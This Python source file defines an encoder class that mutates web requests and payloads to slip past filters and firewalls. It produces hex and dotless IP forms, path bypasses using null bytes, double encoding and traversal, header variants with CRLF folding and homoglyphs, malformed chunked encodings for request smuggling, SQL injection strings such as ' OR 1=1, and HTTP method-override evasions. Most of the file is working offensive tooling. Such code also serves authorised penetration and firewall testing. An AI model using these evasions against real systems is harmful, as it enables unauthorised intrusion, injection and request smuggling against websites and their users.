
from __future__ import annotations
import re
import binascii
import random
import ipaddress
import base64
import logging
import threading
import unicodedata
from collections import OrderedDict
from typing import List, Dict, Tuple, Set, Optional
from urllib.parse import quote, unquote

logger = logging.getLogger(__name__)

class AdvancedEncoder:
    def __init__(self, allow_high_risk: bool = False, max_cache_size: int = 5000):
        self.allow_high_risk = allow_high_risk
        self._cache: OrderedDict[str, object] = OrderedDict()
        self._lock = threading.Lock()
        self.max_cache_size = max_cache_size

        self.request_counter = 0
        self.cache_hits = 0

    def _cache_get(self, key: str):
        with self._lock:
            val = self._cache.get(key)
            if val is not None:
                self._cache.move_to_end(key)
                self.cache_hits += 1
            return val

    def _cache_set(self, key: str, value: object):
        with self._lock:
            self._cache[key] = value
            self._cache.move_to_end(key)
            if len(self._cache) > self.max_cache_size:
                self._cache.popitem(last=False)

    def dotless_ip_encode(self, ip_address: str) -> List[str]:
        cache_key = f"ip_{ip_address}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached 

        self.request_counter += 1
        variations: List[str] = [ip_address]

        try:
            ip_obj = ipaddress.ip_address(ip_address)

            if ip_obj.version == 4:
                hex_ip = hex(int(ip_obj))[2:].zfill(8)
                variations = [
                    f"0x{hex_ip}",
                    f"0x{hex_ip.upper()}",
                    f"0X{hex_ip}",
                    "\\x" + "\\x".join(hex_ip[i:i+2] for i in range(0, 8, 2)),
                ]
                variations.append(f"::ffff:{ip_address}")

            elif ip_obj.version == 6:
                hex_ip = ip_obj.packed.hex()
                variations = [
                    f"0x{hex_ip}",
                    f"[{ip_obj.compressed}]",
                ]
        except ValueError:
            variations = [ip_address]

        self._cache_set(cache_key, variations)
        return variations

    def path_encode(self, path: str, technique: str = "full") -> List[str]:
        cache_key = f"path_{path}_{technique}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached 

        self.request_counter += 1
        encodings: Set[str] = set()

        if technique in ["full", "overencode"]:
            encodings.add(quote(path, safe=""))

        if technique in ["full", "partial"]:
            specials = "/\\?=&%"
            partial = "".join(quote(ch, safe="") if ch in specials else ch for ch in path)
            encodings.add(partial)
            
        if technique in ["full", "overencode"]:
            encodings.add(quote(quote(path, safe=""), safe=""))

        if technique in ["full", "unicode"]:
            encodings.add("".join(f"%{b:02x}" for b in path.encode("utf-8")))
            encodings.add("".join(f"\\u{ord(ch):04x}" for ch in path))

        if technique in ["full", "case"]:
            encodings.add(path.upper())
            encodings.add(path.lower())
            encodings.add("".join(ch.upper() if i % 2 == 0 else ch.lower() for i, ch in enumerate(path)))

        if technique in ["full", "nullbyte"]:
            encodings.add(f"{path}%00")
            encodings.add(f"{path}%00.html")
            encodings.add(f"{path}%00.jpg")

        if technique in ["full", "whitespace"]:
            for ws in ["%09", "%0A", "%0D", "%0C", "%20"]:
                encodings.add(f"{path}{ws}")
                encodings.add(f"{ws}{path}")
                encodings.add(f"{path}{ws}bypass")

        if technique in ["full", "slash"]:
            encodings.add(f"//{path.lstrip('/')}")
            encodings.add(f"/./{path.lstrip('/')}")
            encodings.add(f"/{path.lstrip('/')}/.")
            encodings.add(f"/%2e%2e/{path.lstrip('/')}")

        if technique in ["full", "matrix"]:
            for param in [";", "%3b", ";bypass", ";session=1234"]:
                encodings.add(f"{path}{param}")
                encodings.add(f"{param}{path}")

        result = list(encodings)
        self._cache_set(cache_key, result)
        return result

    def header_encode(self, header_name: str, header_value: str) -> List[Tuple[str, str]]:
        cache_key = f"header_{header_name}_{header_value}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached 
        
        self.request_counter += 1
        out: List[Tuple[str, str]] = []

        out.append((header_name.upper(), header_value))
        out.append((header_name.lower(), header_value))
        out.append(("".join(random.choice([c.upper(), c.lower()]) for c in header_name), header_value))

        for ws in ["\t", "\x20", "\x0b", "\x0c"]:
            out.append((f"{header_name}{ws}", header_value))     
            out.append((header_name, f"{ws}{header_value}"))    
            parts = header_name.split("-")
            if len(parts) > 1:
                out.append((f"{parts[0]}{ws}{'-'.join(parts[1:])}", header_value))

        for fold in ["\r\n ", "\r\n\t"]:
            out.append((header_name, f"{header_value}{fold}continuation"))

        out.append((f"{header_name}\x00", header_value))
        out.append((header_name, f"{header_value}\x00"))

        homoglyphs = {"a": "\u0430", "e": "\u0435", "o": "\u043e", "c": "\u0441"} 
        glyph_name = "".join(homoglyphs.get(c, c) for c in header_name)
        out.append((glyph_name, header_value))

        self._cache_set(cache_key, out)
        return out

    def unicode_normalize_attack(self, payload: str) -> List[str]:
        cache_key = f"unicode_{payload}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached  

        self.request_counter += 1
        variants: Set[str] = set()
        
        variants.add(payload)
        variants.add(unicodedata.normalize("NFD", payload))
        variants.add(unicodedata.normalize("NFKD", payload))
        variants.add(unicodedata.normalize("NFC", payload))
        variants.add(unicodedata.normalize("NFKC", payload))

        confusables = {
            "a": ["\u0430", "\u1d00", "\u1d43"],
            "s": ["\u0455", "\u017f"],
            "i": ["\u0456", "\u1d62"],
            "e": ["\u0435", "\u1d49"],
            "g": ["\u0261"],
            "c": ["\u03f2", "\u1d9c"],
        }
        for ch, reps in confusables.items():
            for r in reps:
                variants.add(payload.replace(ch, r))
                variants.add(payload.replace(ch, r.upper()))

        nfd = unicodedata.normalize("NFD", payload)
        mixed = "".join((a if i % 2 == 0 else b) for i, (a, b) in enumerate(zip(payload, nfd)))
        variants.add(mixed)

        result = list(variants)
        self._cache_set(cache_key, result)
        return result

    def generate_chunked_payload(self, data: bytes, chunk_size: int = 8, anomalies: bool = True) -> bytes:
        if not anomalies:
            chunks: List[bytes] = []
            for i in range(0, len(data), chunk_size):
                chunk = data[i : i + chunk_size]
                chunks.append(f"{len(chunk):X}\r\n".encode() + chunk + b"\r\n")
            chunks.append(b"0\r\n\r\n")
            return b"".join(chunks)

        anomalies_list = [
            b" 5 \r\n",        
            b"00000005\r\n",   
            b"5; note\r\n",   
            b"5\t\r\n",        
            b"5 \x00\r\n",   
        ]
        chunks: List[bytes] = []
        for i in range(0, len(data), chunk_size):
            chunk = data[i : i + chunk_size]
            if random.random() < 0.3:
                header = random.choice(anomalies_list)
            else:
                header = f"{len(chunk):X}\r\n".encode()
            chunks.append(header + chunk + b"\r\n")

        terminations = [b"0\r\n\r\n", b"0\r\n", b"0\r\n\r", b"G\r\n\r\n", b"0\n\n"]
        chunks.append(random.choice(terminations))
        return b"".join(chunks)

    def hex_encode(self, data: str) -> List[str]:
        cache_key = f"hex_{data}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached 

        self.request_counter += 1
        hx = binascii.hexlify(data.encode()).decode()
        out = [
            hx,
            r"\x" + r"\x".join(hx[i : i + 2] for i in range(0, len(hx), 2)),
            "0x" + hx,
            " ".join(hx[i : i + 2] for i in range(0, len(hx), 2)),
            "%" + "%".join(hx[i : i + 2] for i in range(0, len(hx), 2)),
        ]
        self._cache_set(cache_key, out)
        return out

    def html_entity_encode(self, payload: str) -> List[str]:
        cache_key = f"html_{payload}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached  

        self.request_counter += 1
        basic = "".join(f"&#{ord(c)};" for c in payload)
        mixed = "".join(f"&#{ord(c)};" if random.random() > 0.5 else c for c in payload)
        double = "".join(f"&#{ord(c)};" for c in basic)  
        named_map = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&apos;", "&": "&amp;", "/": "&frasl;"}
        named = "".join(named_map.get(c, c) for c in payload)

        out = [basic, mixed, double, named]
        self._cache_set(cache_key, out)
        return out

    def base64_encode(self, data: str, variations: bool = True) -> List[str]:
        cache_key = f"base64_{data}_{variations}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached 

        self.request_counter += 1
        std = base64.b64encode(data.encode()).decode()
        out = [std]

        if variations:
            out.append(base64.urlsafe_b64encode(data.encode()).decode())
            out.append(std.rstrip("="))
            out.append("\n".join(std[i : i + 76] for i in range(0, len(std), 76)))
            custom_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+$"
            trans = str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", custom_charset)
            out.append(base64.b64encode(data.encode()).decode().translate(trans))

        self._cache_set(cache_key, out)
        return out

    def generate_obfuscated_sql(self, sql: str) -> List[str]:
        if not self.allow_high_risk:
            logger.warning("generate_obfuscated_sql called while high-risk helpers are disabled.")
            return []

        cache_key = f"sql_{sql}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached 

        self.request_counter += 1
        obf: Set[str] = set()

        for c in ["--", "/*", "#", "-- -"]:
            obf.add(f"{sql} {c}")

        for ws in [" ", "\t", "\n", "\r", "\x0c"]:
            obf.add(sql.replace(" ", ws))

        obf.add("SE" + "LECT * FROM users")
        obf.add("UNI" + "\x0c" + "ON SEL" + "\t" + "ECT * FROM users")
        obf.update({" OR 1=1", "' OR 'a'='a", "' OR 1 --", "' OR ''='"})
        obf.add(sql + "\x00")

        out = list(obf)
        self._cache_set(cache_key, out)
        return out

    def generate_protocol_evasion(self, method: str, path: str, protocol: str = "HTTP/1.1") -> List[str]:
        if not self.allow_high_risk:
            logger.warning("generate_protocol_evasion called while high-risk helpers are disabled.")
            return []
        
        cache_key = f"protocol_{method}_{path}_{protocol}"
        cached = self._cache_get(cache_key)
        if cached is not None:
            return cached 

        self.request_counter += 1
        evasions: Set[str] = set()

        for ver in ["HTTP/1.1", "HTTP/1.0", "HTTP/0.9", "HTTP/2"]:
            evasions.add(f"{method} {path} {ver}")

        evasions.add(f"GET {path} HTTP/1.1\r\nX-HTTP-Method-Override: {method}")
        evasions.add(f"POST {path} HTTP/1.1\r\nX-HTTP-Method-Override: {method}")

        for ws in [" ", "\t", "\x20", "\x0b"]:
            evasions.add(f"{method}{ws}{path}{ws}{protocol}")

        evasions.add(f"{method.lower()} {path} {protocol.lower()}")
        evasions.add(f"{method.upper()} {path} {protocol.upper()}")
        evasions.add(f"{method[:2].lower()}{method[2:].upper()} {path} {protocol}")
        evasions.add(f"{method} {path} \r\n{protocol}")

        out = list(evasions)
        self._cache_set(cache_key, out)
        return out

    def get_cache_stats(self) -> Dict[str, float]:
        with self._lock:
            req = max(1, self.request_counter)
            return {
                "cache_size": float(len(self._cache)),
                "requests": float(self.request_counter),
                "cache_hits": float(self.cache_hits),
                "hit_ratio": float(self.cache_hits) / req,
            }

    def clear_cache(self):
        with self._lock:
            self._cache.clear()
            self.request_counter = 0
            self.cache_hits = 0

nsa_encoder = AdvancedEncoder()
